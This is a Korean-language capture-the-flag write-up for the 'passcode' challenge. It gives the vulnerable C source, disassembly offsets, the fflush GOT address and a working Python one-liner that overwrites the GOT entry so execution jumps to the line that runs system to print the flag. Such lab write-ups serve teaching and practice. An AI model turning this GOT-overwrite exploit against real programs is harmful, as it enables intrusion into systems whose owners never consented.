# passcode 
~~~c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
  printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
~~~
* passcode.c file이다. 여기서 scanf에서 취약점이 발생한다. passcode1이라는 이름이 가리키는 주소에 값이 들어가는 것이 아니라 passcode1의 값 자체에 
저장되게 된다. 따라서 passcode1을 원하는 주소로 덮어쓰면 scanf를 통해 그 주소에 값을 적을 수 있다. 먼저 passcode의 주소를 알아야 한다.
~~~
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
~~~
passcode1의 주소는 ebp-0x10이다.
~~~
   0x0804862f <+38>:	lea    -0x70(%ebp),%edx
   0x08048632 <+41>:	mov    %edx,0x4(%esp)
   0x08048636 <+45>:	mov    %eax,(%esp)
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
~~~
welcome의 주소는 ebp-0x70이므로 96(0x60)값을 넣어서 passcode1을 덮어쓸 수 있다.
여기서 passcode를 fflush got 값으로 변조시키면 fflush got에 값을 넣을 수 있게 되고  이제 system 함수를 실행하는 줄의 주소를 넣어주면 된다.
~~~
 08048430 <fflush@plt>:
 8048430:	ff 25 04 a0 04 08    	jmp    *0x804a004
 8048436:	68 08 00 00 00       	push   $0x8
 804843b:	e9 d0 ff ff ff       	jmp    8048410 <_init+0x30>
~~~
fflush got:0x804a004
~~~
  0x080485e3 <+127>:	movl   $0x80487af,(%esp)
  0x080485ea <+134>:	call   0x8048460 <system@plt>
~~~
system 함수가 시작하는 주소: 0x080485e3
~~~
passcode@pwnable:~$ (python -c 'print "A"*96+"\x04\xa0\x04\x08"';cat) | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
134514147
~~~
system 함수값을 아무 생각없이 그대로 넣어주다 안 되서 롸업 봤더니 정수값으로 넣어줘야 하는 것을 알 수 있었다.


